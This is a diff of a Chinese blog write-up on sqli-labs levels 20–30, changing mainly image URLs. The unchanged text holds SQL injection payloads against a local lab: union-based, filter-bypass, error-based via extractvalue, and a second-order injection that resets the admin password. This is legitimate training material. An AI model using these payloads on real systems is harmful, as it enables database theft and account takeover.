@@ -43,18 +43,18 @@
 <meta property="og:site_name" content="Hades">
 <meta property="og:description" content="20-22cookie注入第二十题后台主要代码：$sql=&amp;quot;SELECT * FROM users WHERE username=&amp;#39;$cookee&amp;#39; LIMIT 0,1&amp;quot;; 在第一次登陆验证以后会将第二次的cookie值带入数据库进行查询，可以利用第二次的cookie值进行注入。 payload1：uname=admin&amp;#39;&amp;amp;passwd=1 pa">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:image" content="http://pw5q6scnw.bkt.clouddn.com/BXCPBWARJ7EEFXFW%28IA7Y2A.png">
-<meta property="og:image" content="http://pw5q6scnw.bkt.clouddn.com/~9VF~VEX$L%28CUCW9F2%5BO3KN.png">
-<meta property="og:image" content="http://pw5q6scnw.bkt.clouddn.com/%29%7DG$~%5DOR%7DMOH$N6@%29TZH8%7DH.png">
-<meta property="og:image" content="http://pw5q6scnw.bkt.clouddn.com/_9L3UW1IX%28OBF%7BQL5U7W75A.png">
-<meta property="og:image" content="http://pw5q6scnw.bkt.clouddn.com/B%60OW%29E9V@G_CV6%2837JB%7B7%291.png">
-<meta property="og:image" content="http://pw5q6scnw.bkt.clouddn.com/C~4FVBU%25N%7BRQI%5BWNVUR4Z%5DX.png">
-<meta property="og:image" content="http://pw5q6scnw.bkt.clouddn.com/%25RS2_F%25@%60IZKL95R~SMKTYC.png">
-<meta property="og:updated_time" content="2019-08-26T13:30:59.260Z">
+<meta property="og:image" content="https://hades-1300189337.cos.ap-chengdu.myqcloud.com/blog%E5%9B%BE%E7%89%87/1/BXCPBWARJ7EEFXFW%28IA7Y2A.png">
+<meta property="og:image" content="https://hades-1300189337.cos.ap-chengdu.myqcloud.com/blog%E5%9B%BE%E7%89%87/1/_9VF_VEX%24L%28CUCW9F2%5BO3KN.png">
+<meta property="og:image" content="https://hades-1300189337.cos.ap-chengdu.myqcloud.com/blog%E5%9B%BE%E7%89%87/1/ABC.png">
+<meta property="og:image" content="https://hades-1300189337.cos.ap-chengdu.myqcloud.com/blog%E5%9B%BE%E7%89%87/1/_9L3UW1IX%28OBF%7BQL5U7W75A.png">
+<meta property="og:image" content="https://hades-1300189337.cos.ap-chengdu.myqcloud.com/blog%E5%9B%BE%E7%89%87/1/B%60OW%29E9V%40G_CV6%2837JB%7B7%291.png">
+<meta property="og:image" content="https://hades-1300189337.cos.ap-chengdu.myqcloud.com/blog%E5%9B%BE%E7%89%87/1/C_4FVBU%25N%7BRQI%5BWNVUR4Z%5DX.png">
+<meta property="og:image" content="https://hades-1300189337.cos.ap-chengdu.myqcloud.com/blog%E5%9B%BE%E7%89%87/1/YC.png">
+<meta property="og:updated_time" content="2019-09-08T12:58:00.550Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="sqli-labs20-30">
 <meta name="twitter:description" content="20-22cookie注入第二十题后台主要代码：$sql=&amp;quot;SELECT * FROM users WHERE username=&amp;#39;$cookee&amp;#39; LIMIT 0,1&amp;quot;; 在第一次登陆验证以后会将第二次的cookie值带入数据库进行查询，可以利用第二次的cookie值进行注入。 payload1：uname=admin&amp;#39;&amp;amp;passwd=1 pa">
-<meta name="twitter:image" content="http://pw5q6scnw.bkt.clouddn.com/BXCPBWARJ7EEFXFW%28IA7Y2A.png">
+<meta name="twitter:image" content="https://hades-1300189337.cos.ap-chengdu.myqcloud.com/blog%E5%9B%BE%E7%89%87/1/BXCPBWARJ7EEFXFW%28IA7Y2A.png">
 
 
 <link rel="stylesheet" type="text/css" href="/css/style.css?v=1.1">
@@ -159,7 +159,7 @@
 
 <p>只要不用注释去闭合后面的单引号就可以 </p>
 <p>payload：<code>http://127.0.0.1/sqli-labs/Less-23/?id=1&#39; union select 1,2,3 and  &#39;1&#39;=&#39;1</code></p>
-<p><img src="http://pw5q6scnw.bkt.clouddn.com/BXCPBWARJ7EEFXFW%28IA7Y2A.png" alt="1."></p>
+<p><img src="https://hades-1300189337.cos.ap-chengdu.myqcloud.com/blog%E5%9B%BE%E7%89%87/1/BXCPBWARJ7EEFXFW%28IA7Y2A.png" alt="1."></p>
 <h3 id="24二次注入"><a href="#24二次注入" class="headerlink" title="24二次注入"></a>24二次注入</h3><p>第二十四题后台有8个文件，与数据库进行交互的有以下几个地方：</p>
 <p><code>login.php</code>:  </p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$username = mysql_real_escape_string($_POST[&quot;login_user&quot;]);</span><br><span class="line">$password = mysql_real_escape_string($_POST[&quot;login_password&quot;]);</span><br><span class="line">$sql = &quot;SELECT * FROM users WHERE username=&apos;$username&apos; and password=&apos;$password&apos;&quot;;</span><br></pre></td></tr></table></figure>
@@ -171,10 +171,10 @@
 <p>对源码分析以后，我们该如何利用？</p>
 <p>二次注入的原理在于我们第一次插入的代码可以在第二次时候构成注入，使得我们达到想要的效果。</p>
 <p>我们先注册一个<code>username=admin&#39;#</code> <code>password=123</code> 的用户。</p>
-<p><img src="http://pw5q6scnw.bkt.clouddn.com/~9VF~VEX$L%28CUCW9F2%5BO3KN.png" alt="2"></p>
+<p><img src="https://hades-1300189337.cos.ap-chengdu.myqcloud.com/blog%E5%9B%BE%E7%89%87/1/_9VF_VEX%24L%28CUCW9F2%5BO3KN.png" alt="2"></p>
 <p>使用该账号登录，修改密码的时候构成二次注入，可修改<code>admin</code>账号的密码。</p>
-<p><img src="http://pw5q6scnw.bkt.clouddn.com/%29%7DG$~%5DOR%7DMOH$N6@%29TZH8%7DH.png" alt="4"></p>
-<p><img src="http://pw5q6scnw.bkt.clouddn.com/_9L3UW1IX%28OBF%7BQL5U7W75A.png" alt="3"></p>
+<p><img src="https://hades-1300189337.cos.ap-chengdu.myqcloud.com/blog%E5%9B%BE%E7%89%87/1/ABC.png" alt="4"></p>
+<p><img src="https://hades-1300189337.cos.ap-chengdu.myqcloud.com/blog%E5%9B%BE%E7%89%87/1/_9L3UW1IX%28OBF%7BQL5U7W75A.png" alt="3"></p>
 <h3 id="25and，or-过滤"><a href="#25and，or-过滤" class="headerlink" title="25and，or 过滤"></a>25and，or 过滤</h3><p>打开第25关，就看见<code>All your &#39;or&#39; and &#39;and&#39; belong to us!</code> 行吧。</p>
 <p>我们试试双写呗，看你过滤几个。</p>
 <p>payload：<code>http://127.0.0.1/sqli-labs/Less-25/?id=-1&#39; union select 1,2,3  oorr &#39;1&#39;=&#39;1</code></p>
@@ -185,7 +185,7 @@
 
 <p>过滤的挺多的，可以尝试xml函数报错注入。</p>
 <p>payload：<code>http://127.0.0.1/sqli-labs/Less-26/?id=1&#39;||extractvalue(1,concat(0x7e,database(),0x7e))||&#39;1&#39;=&#39;1</code></p>
-<p><img src="http://pw5q6scnw.bkt.clouddn.com/B%60OW%29E9V@G_CV6%2837JB%7B7%291.png" alt="5"></p>
+<p><img src="https://hades-1300189337.cos.ap-chengdu.myqcloud.com/blog%E5%9B%BE%E7%89%87/1/B%60OW%29E9V%40G_CV6%2837JB%7B7%291.png" alt="5"></p>
 <h3 id="27-28UNION，SELECT过滤"><a href="#27-28UNION，SELECT过滤" class="headerlink" title="27,28UNION，SELECT过滤"></a>27,28UNION，SELECT过滤</h3><p>27题就是变态啊，看了代码基本啥都过滤，对小白极度不友好啊！</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">function blacklist($id)</span><br><span class="line">&#123;</span><br><span class="line">$id= preg_replace(&apos;/[\/\*]/&apos;,&quot;&quot;, $id);		//strip out /*</span><br><span class="line">$id= preg_replace(&apos;/[--]/&apos;,&quot;&quot;, $id);		//Strip out --.</span><br><span class="line">$id= preg_replace(&apos;/[#]/&apos;,&quot;&quot;, $id);			//Strip out #.</span><br><span class="line">$id= preg_replace(&apos;/[ +]/&apos;,&quot;&quot;, $id);	    //Strip out spaces.</span><br><span class="line">$id= preg_replace(&apos;/select/m&apos;,&quot;&quot;, $id);	    //Strip out spaces.</span><br><span class="line">$id= preg_replace(&apos;/[ +]/&apos;,&quot;&quot;, $id);	    //Strip out spaces.</span><br><span class="line">$id= preg_replace(&apos;/union/s&apos;,&quot;&quot;, $id);	    //Strip out union</span><br><span class="line">$id= preg_replace(&apos;/select/s&apos;,&quot;&quot;, $id);	    //Strip out select</span><br><span class="line">$id= preg_replace(&apos;/UNION/s&apos;,&quot;&quot;, $id);	    //Strip out UNION</span><br><span class="line">$id= preg_replace(&apos;/SELECT/s&apos;,&quot;&quot;, $id);	    //Strip out SELECT</span><br><span class="line">$id= preg_replace(&apos;/Union/s&apos;,&quot;&quot;, $id);	    //Strip out Union</span><br><span class="line">$id= preg_replace(&apos;/Select/s&apos;,&quot;&quot;, $id);	    //Strip out select</span><br><span class="line">return $id;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
@@ -194,10 +194,10 @@
 <h3 id="29，30这两个题好像挺水的"><a href="#29，30这两个题好像挺水的" class="headerlink" title="29，30这两个题好像挺水的"></a>29，30这两个题好像挺水的</h3><p>没有过滤什么，可以直接注入。</p>
 <p>29payload：</p>
 <p><code>http://127.0.0.1/sqli-labs/Less-29/?id=-1%27%20union%20select%201,database(),3%20or%20%271%27=%271</code></p>
-<p><img src="http://pw5q6scnw.bkt.clouddn.com/C~4FVBU%25N%7BRQI%5BWNVUR4Z%5DX.png" alt="5"></p>
+<p><img src="https://hades-1300189337.cos.ap-chengdu.myqcloud.com/blog%E5%9B%BE%E7%89%87/1/C_4FVBU%25N%7BRQI%5BWNVUR4Z%5DX.png" alt="5"></p>
 <p>30payload：</p>
 <p><code>http://127.0.0.1/sqli-labs/Less-30/?id=0&quot; union select 1,database(),3--+</code></p>
-<p><img src="http://pw5q6scnw.bkt.clouddn.com/%25RS2_F%25@%60IZKL95R~SMKTYC.png" alt="5"></p>
+<p><img src="https://hades-1300189337.cos.ap-chengdu.myqcloud.com/blog%E5%9B%BE%E7%89%87/1/YC.png" alt="5"></p>
 <p>注：26-28看很多大佬有用%a0代替空格注入成功的，也尝试了一下，但是好像都被解析成 ‘？’了，所以就只写了报错的注入方式。</p>
 
             </div>
